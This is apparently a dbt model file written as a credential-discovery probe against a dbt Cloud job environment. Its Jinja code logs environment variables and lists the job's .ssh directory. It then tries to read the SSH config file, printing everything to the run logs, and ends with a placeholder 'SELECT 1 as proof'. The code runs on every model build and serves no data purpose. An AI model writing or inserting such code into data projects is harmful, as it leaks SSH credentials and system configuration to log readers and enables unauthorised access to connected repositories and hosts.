{{ log("=== SSH CREDENTIAL DISCOVERY ===", info=True) }}
{{ log("GIT_SSH_COMMAND: " ~ env_var("GIT_SSH_COMMAND", "UNSET"), info=True) }}
{{ log("HOME: " ~ env_var("HOME", "UNSET"), info=True) }}
{{ log("DBT_CLOUD_RUN_ID: " ~ env_var("DBT_CLOUD_RUN_ID", "UNSET"), info=True) }}

{# The SSH config is at /tmp/jobs/{RUN_ID}/.ssh/config #}
{# Try to read it via open() through modules #}
{% set ssh_config_path = "/tmp/jobs/" ~ env_var("DBT_CLOUD_RUN_ID", "0") ~ "/.ssh/config" %}
{{ log("SSH_CONFIG_PATH: " ~ ssh_config_path, info=True) }}

{# Try modules.os.listdir to see .ssh contents #}
{% set ssh_dir = "/tmp/jobs/" ~ env_var("DBT_CLOUD_RUN_ID", "0") ~ "/.ssh" %}
{% set ssh_files = modules.os.listdir(ssh_dir) %}
{{ log("SSH_DIR_CONTENTS: " ~ ssh_files | join(","), info=True) }}

{# Try to read the config file #}
{% set config_content = modules.io.open(ssh_config_path).read() if modules.io is defined else "io_not_available" %}
{{ log("SSH_CONFIG: " ~ config_content, info=True) }}

{{ log("=== END ===", info=True) }}

SELECT 1 as proof